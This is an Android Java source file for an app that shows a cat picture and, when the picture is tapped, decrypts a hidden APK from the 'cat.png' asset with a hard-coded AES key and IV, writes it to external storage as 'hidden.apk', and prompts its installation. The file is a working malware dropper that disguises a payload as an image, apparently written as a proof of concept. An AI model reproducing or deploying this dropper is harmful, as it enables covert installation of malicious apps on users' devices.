package com.example.zaharia.alex.wrapperapp;

import android.content.Intent;
import android.content.res.AssetManager;
import android.graphics.drawable.Drawable;
import android.net.Uri;
import android.os.Environment;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.ImageButton;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;

import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

public class MainActivity extends AppCompatActivity {
    public ImageButton mImage = null;
    public static final String MALICIOUS_APK = Environment.getExternalStorageDirectory() + "/hidden.apk";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        mImage = (ImageButton) findViewById(R.id.imageButton);

        try {
            InputStream ims = getAssets().open("cat.png");
            Drawable d = Drawable.createFromStream(ims, null);
            mImage.setImageDrawable(d);
        } catch (IOException exp) {
            exp.printStackTrace();
        }

        mImage.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                try {
                    Log.i("AZAHARIA", "reading asset...");
                    byte[] png = readAsset("cat.png");

                    // decrypting
                    String key = "MyKey12345678901";

                    // IV:               $            \xc6         \x14         \x15
                    //                   \xf5         \xa5         \xcb         ]
                    //                   \xf8         \x13         \xe7         '
                    //                   L            8            ]            \xe5

                    byte[] iv = {(byte) 0x24, (byte) 0xc6, (byte) 0x14, (byte) 0x15,
                                 (byte) 0xf5, (byte) 0xa5, (byte) 0xcb, (byte) 0x5d,
                                 (byte) 0xf8, (byte) 0x13, (byte) 0xe7, (byte) 0x27,
                                 (byte) 0x4c, (byte) 0x38, (byte) 0x5d, (byte) 0xe5};


                    Log.i("AZAHARIA", "decrypting asset...");
                    byte[] decrypted = decrypt(key.getBytes(), iv, png);

                    // dumping the decrypted asset
                    Log.i("AZAHARIA", "writing decrypted asset to: " + MainActivity.MALICIOUS_APK);
                    writeFile(decrypted, MainActivity.MALICIOUS_APK);

                    // installing it
                    Log.i("AZAHARIA", "installing apk...");
                    installApk(MainActivity.MALICIOUS_APK);

                    Log.i("AZAHARIA", "done");
                } catch (Exception exp) {
                    Log.e("AZAHARIA", "Exception caught: " + exp.toString());
                    exp.printStackTrace();
                }
            }
        });
    }

    public byte[] readAsset(String filename) throws IOException {
        AssetManager assetmanager = getAssets();
        InputStream in = assetmanager.open(filename);
        int size = in.available();
        byte[] buffer = new byte[size];
        in.read(buffer);
        in.close();
        return buffer;
    }

    public void writeFile(byte[] array, String filename) throws Exception {
        File myFile = new File(filename);
        myFile.createNewFile();
        FileOutputStream fout = new FileOutputStream(myFile);
        fout.write(array, 0, array.length);
        fout.close();
    }

    public void installApk(String filename) {
        Intent intent = new Intent(Intent.ACTION_VIEW);
        Log.i("AZAHARIA", "File: " + filename);
        intent.setDataAndType(Uri.fromFile(new File(filename)), "application/vnd.android.package-archive");
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        Log.i("AZAHARIA", "Intent is: " + intent.toString());
        startActivity(intent);
    }

    private static byte[] decrypt(byte[] keyBytes,
                                  byte[] iv,
                                  byte[] ciphertext) throws Exception {
        IvParameterSpec ivspec = new IvParameterSpec(iv);
        SecretKeySpec sk = new SecretKeySpec(keyBytes, "AES");
        Cipher cipher = Cipher.getInstance("AES/CBC/NoPadding");
        cipher.init(Cipher.DECRYPT_MODE, sk, ivspec);
        byte[] decrypted = cipher.doFinal(ciphertext);
        return decrypted;
    }

}
